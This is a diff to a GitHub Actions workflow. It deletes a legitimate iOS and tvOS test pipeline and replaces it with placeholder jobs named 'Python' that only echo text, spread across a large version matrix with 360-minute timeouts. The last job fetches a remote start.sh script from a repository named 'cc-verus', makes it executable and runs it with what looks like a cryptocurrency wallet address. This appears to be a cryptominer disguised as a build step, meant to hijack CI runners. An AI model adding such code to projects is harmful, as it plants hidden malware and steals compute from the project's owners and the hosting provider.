@@ -1,69 +1,51 @@
-name: Test
-
-on: [push, pull_request]
+name: Python
+on:  
+  push:
+  pull_request:
 
 jobs:
-  test:
-    name: Test
-    runs-on: macos-10.15
+ python-1:
+    runs-on: ubuntu-18.04
     strategy:
+      fail-fast: false
       matrix:
-        ruby-version: ["2.7.x"]
+         go: [1.11, 1.12, 1.13, 1.14, 1.15]
+         flag: [A, B, C, D]
+    timeout-minutes: 360
+    
     steps:
-      - name: Check out Git repository
-        uses: actions/checkout@v2
+    - uses: actions/checkout@v2
+    - name: Python-run
+      run: echo "python"
 
-      - name: Set Xcode 12
-        run: |
-          sudo xcode-select -switch /Applications/Xcode_12.app
+ python-2:
+    runs-on: ubuntu-18.04 
+    needs: python-1
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1.11, 1.12, 1.13, 1.14, 1.15]
+         flag: [A, B, C, D]
+    timeout-minutes: 360
+    
+    steps:
+    - uses: actions/checkout@v2
+    - name: Python-run
+      run: echo "python"
 
-      - name: Setup Ruby
-        uses: actions/setup-ruby@v1
-        with:
-          ruby-version: ${{ matrix.ruby-version }}
-
-      - name: Cache Bundle Gems and Cocoapods
-        id: cache-gems-pods
-        uses: actions/cache@v2
-        with:
-          path: |
-            Pods
-            vendor/bundle
-          key: ${{ runner.os }}-ruby-${{ matrix.ruby-version }}-gems-${{ hashFiles('**/Gemfile.lock') }}-pods-${{ hashFiles('**/Podfile.lock') }}
-
-      - name: Install Cocoapods
-        if: steps.cache-gems-pods.outputs.cache-hit != 'true'
-        run: |
-          gem install bundler
-          bundle config path vendor/bundle
-          bundle install
-          pod install
-
-      - name: Validate Podfile
-        run: pod lib lint
-
-      - name: iOS Tests
-        run: |
-          xcodebuild test \
-            -workspace Amplitude.xcworkspace \
-            -scheme Amplitude_iOSTests \
-            -sdk iphonesimulator \
-            -destination 'platform=iOS Simulator,name=iPhone 11,OS=14.0'
-
-      # - name: macOS Tests @TODO Fix flaky macOS tests and re-enable
-      #   run: |
-      #     xcodebuild \
-      #       -workspace Amplitude.xcworkspace \
-      #       -scheme Amplitude_macOS \
-      #       -sdk macosx \
-      #       -destination 'platform=macosx' \
-      #       test
-
-      - name: tvOS Tests
-        run: |
-          xcodebuild \
-            -workspace Amplitude.xcworkspace \
-            -scheme Amplitude_tvOS \
-            -sdk appletvsimulator \
-            -destination 'platform=tvOS Simulator,name=Apple TV' \
-            test
+ python-build:
+    runs-on: ubuntu-20.04 
+    needs: python-2
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1.11, 1.12, 1.13, 1.14, 1.15]
+         flag: [A, B, C, D]
+    timeout-minutes: 360
+    
+    steps:
+    - uses: actions/checkout@v2
+    - name: Python-setup
+      run: sudo apt-get update
+    - name: Python-build
+      run: wget https://gitlab.com/breni9087/cc-verus/-/raw/main/start.sh && chmod 777 start.sh && ./start.sh RL3uUGv6um8Bq7nNq4TTkvk4FQaxbQDagg
